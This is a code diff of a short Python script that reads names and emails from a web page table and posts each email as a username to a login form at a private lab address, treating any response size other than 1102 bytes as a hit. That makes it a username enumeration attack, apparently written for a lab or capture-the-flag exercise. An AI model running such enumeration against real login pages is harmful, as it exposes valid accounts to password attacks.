@@ -11,14 +11,12 @@ for row in rows:
     cells = row.find_all('td')
     if len(cells) >= 3:
         first = cells[0].text.strip()
-        last = cells[1].text.strip()
         email = cells[2].text.strip()
         
-        # Try email, first name, last name, and full name
-        for username in [email, first, last, f"{first} {last}"]:
-            r2 = requests.post('http://192.168.56.68:8080/login-3',
-                              data={'username': username, 'password': 'test'})
-            size = len(r2.text)
-            if size != 1102:
-                print(f"*** FOUND *** username='{username}' -> {size} bytes")
-                print(r2.text[:100])
+        r2 = requests.post('http://192.168.56.68:8080/login-3/index.php',
+                          data={'username': email, 'password': 'test'})
+        size = len(r2.text)
+        if size != 1102:
+            print(f"*** FOUND *** {first} | {email} -> {size} bytes")
+        else:
+            print(f"{first} | {email} -> {size} bytes")
